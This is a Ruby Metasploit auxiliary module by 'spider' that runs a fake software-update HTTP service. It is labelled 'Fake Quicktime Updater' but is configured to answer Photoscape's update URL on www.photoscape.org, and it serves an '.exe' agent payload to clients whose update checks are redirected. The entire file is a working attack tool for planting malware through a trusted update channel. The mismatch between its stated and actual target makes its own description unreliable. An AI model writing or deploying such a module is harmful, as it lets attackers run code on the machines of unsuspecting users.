require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake Quicktime Updater',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake Quicktime  updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptString.new('DESCRIPTION',    [ true, "Update description", "spider was here" ]),
			], self.class)
		
		@base = {	
			'vh' => ['www.photoscape.org'],
			'request' => [{
				'req' => '(/update/update.php)', 
				'type' => 'file', 
				'bin'    => 1,
				'string' => '', 
				'parse' => 1,
				'file' => 'photoscape',
			},
			{
				'req' => '.exe', 
				'type' => 'agent', 
				'bin'    => 1,		    
				'string' => '',
				'parse' => 0,
				'file' => ''
			}
			],
			'options' => {
				'description'  => { 
					'val' => datastore['description'] ,
					'dynamic' => 0 
				},
				'rnd1'  => { 
					'val' => "RndNum(3)",
					'dynamic' => 1 
				}
			}
		}
	end
end
